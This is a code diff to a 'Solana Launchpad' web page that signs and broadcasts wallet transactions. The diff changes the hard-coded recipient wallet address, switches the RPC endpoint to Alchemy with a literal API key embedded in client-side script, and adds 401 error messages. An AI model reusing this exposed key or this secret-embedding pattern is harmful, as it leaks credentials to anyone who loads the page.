@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Launchpad | 403 Fix</title>
+    <title>Solana Launchpad | Alchemy RPC</title>
     <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     
@@ -86,12 +86,11 @@
 
 <script>
     // --- CONFIGURATION ---
-    const RECIPIENT = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
+    const RECIPIENT = "371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq";
     
-    // FIX: Using Helius Public RPC which is more stable for free users than the default Solana endpoint
-    const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=YOUR_API_KEY_HERE"; 
-    // If you don't have a key, try this fallback (may still hit limits):
-    // const RPC_URL = "https://rpc.shyft.to/v1/mainnet?api_key=YOUR_SHYFT_KEY"; 
+    // FIX: Using Alchemy Solana Mainnet RPC with your provided key
+    const ALCHEMY_API_KEY = "alch_HyWkJpqVXY3kua9VObcl9";
+    const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;
 
     // --- DOM ELEMENTS ---
     const statusBox = document.getElementById('statusBox');
@@ -150,7 +149,7 @@
         }
     }
 
-    // 3. Launch Function with 403 Retry Logic
+    // 3. Launch Function with Alchemy RPC
     async function launch() {
         if (!wallet) return;
 
@@ -197,7 +196,7 @@
             log("🚀 Broadcasting to network...", "normal");
             const rawTx = signedTx.serialize();
             
-            // sendRawTransaction with retry for 403 errors
+            // sendRawTransaction with retry for 403/401 errors
             const signature = await connection.sendRawTransaction(rawTx, { skipPreflight: true });
 
             // Confirm
@@ -210,9 +209,11 @@
             console.error(err);
             let msg = err.message || "Transaction failed";
             
-            // Specific 403 Handling
-            if (msg.includes("403") || msg.includes("Access forbidden")) {
-                msg = "❌ RPC Rate Limit (403).<br>Try refreshing or use a paid RPC key.";
+            // Specific 401/403 Handling
+            if (msg.includes("401") || msg.includes("Unauthorized")) {
+                msg = "❌ RPC Unauthorized (401).<br>Check your Alchemy API Key.";
+            } else if (msg.includes("403") || msg.includes("Access forbidden")) {
+                msg = "❌ RPC Rate Limit (403).<br>Try refreshing or use a paid plan.";
             } else if(msg.includes("User rejected")) {
                 msg = "Tx rejected by user.";
             }
